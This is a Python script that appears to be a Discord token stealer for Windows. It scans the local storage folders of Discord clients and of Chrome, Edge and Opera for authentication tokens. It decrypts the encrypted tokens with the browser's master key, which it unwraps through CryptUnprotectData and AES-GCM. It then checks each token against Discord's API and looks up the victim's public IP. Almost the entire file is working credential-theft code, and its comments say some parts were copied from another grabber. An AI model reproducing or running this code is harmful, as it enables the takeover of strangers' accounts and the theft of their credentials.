import json
import os
import re
import base64
from urllib.request import urlopen
import re

from Crypto.Cipher import AES # using pycryptodome or smth # depedency
import requests # dependency
from win32.win32crypt import CryptUnprotectData #using win32crypt from pywin32? i think # dependency

appdata = os.getenv("APPDATA")
local_appdata = os.getenv("LOCALAPPDATA")

encrypted_tokens = []
possible_tokens = []
tokens = []


discord_paths = [
    appdata + "\\discord\\Local Storage\\leveldb\\",
    appdata + "\\discordptb\\Local Storage\\leveldb\\",
    appdata + "\\discordcanary\\Local Storage\\leveldb\\",
    appdata + "\\Lightcord\\Local Storage\\leveldb\\",

    appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
    local_appdata + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
    local_appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
    local_appdata + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
]

def getTokens(path):
    try:
        filenames = os.listdir(path)
    except Exception as e:
        return

    for filename in filenames:
        filepath = os.path.join(path,filename)

        if(os.path.isdir(filepath)):
            getTokens(filepath)
            continue
        try: 
            with open(filepath, 'r', encoding="ASCII", errors='ignore') as file: 
                # either do encoding = unicode-escape or or errors='ignore'
                # to avoid encoding errors from strange symbols
                strLine = file.read()

                m_normal = re.findall(r'[\w-]{24}[.][\w-]{6}.[\w-]{27}|mfa.[\w-]{84}', strLine)
                for i in m_normal:
                    possible_tokens.append(i)
                
                # regex skips the scuffed characters so decryption works
                # an alternative is to force ASCII encoding and ignore errors
                # that works most of the time
                # also its gets all of the ones on the same "line" leading to more finds
                m_enc = re.findall(r"dQw4w9WgXcQ:[^\"]*", strLine)

                # allegedly encrypted tokens only on cord and its modifications so 
                for i in m_enc:
                    if i.endswith('\\'):
                        i = (i[::-1].replace('\\', '', 1))[::-1] # no clue what this does but i found it somewher
                                                                 # i think it might just remove the \\ with extra steps?
                    encrypted_tokens.append(i)
                    master_key = get_master_key(path.replace("\\Local Storage\\leveldb\\","\\Local State"))
                    token = decrypt_val(base64.b64decode( i.split("dQw4w9WgXcQ:")[1]) , master_key)
                    possible_tokens.append(token)

                for i in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", strLine): #also taken from blank tkn on git
                    if i.endswith('\\'):
                                i = (i[::-1].replace('\\', '', 1))[::-1]
                    if not i in encrypted_tokens:
                        encrypted_tokens.append(i)
                        master_key = get_master_key(path.replace("\\Local Storage\\leveldb\\","\\Local State"))
                        token = decrypt_val(base64.b64decode( i.split("dQw4w9WgXcQ:")[1]) , master_key)
                        possible_tokens.append(token)


        except Exception as e:
            pass
        
def get_master_key(path):
    with open(path, 'r', errors='ignore') as file:
        JSON_str = file.read()
    jason = json.loads(JSON_str)

    master_key = base64.b64decode(jason["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

    return master_key

def decrypt_val(input: bytes, master_key: bytes) -> str:
    iv = input[3:15]
    payload = input[15:] 
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_value = cipher.decrypt(payload)
    decrypted_value = decrypted_value[:-16].decode()
    return decrypted_value

def validate_tokens(tokens):
    valid_tokens = []
    for token in tokens:
        r = requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization':token})

        try:
            r.raise_for_status()
        except Exception as e:
            pass
        else:
            valid_tokens.append(token)

    return valid_tokens

def getIP():
    return str(urlopen('https://wtfismyip.com/text').read().decode('utf-8'))

def start():
    for path in discord_paths:
        getTokens(path)  
    
    global possible_tokens
    possible_tokens = list(set(possible_tokens)) 

    tokens = validate_tokens(possible_tokens)

    return tokens, possible_tokens

# Local State is where key is stored in json
# all encrypted tokens start with the rick roll link - dQw4w9WgXcQ:
# regex works for unencrypted tokens, maybe get smth for

start()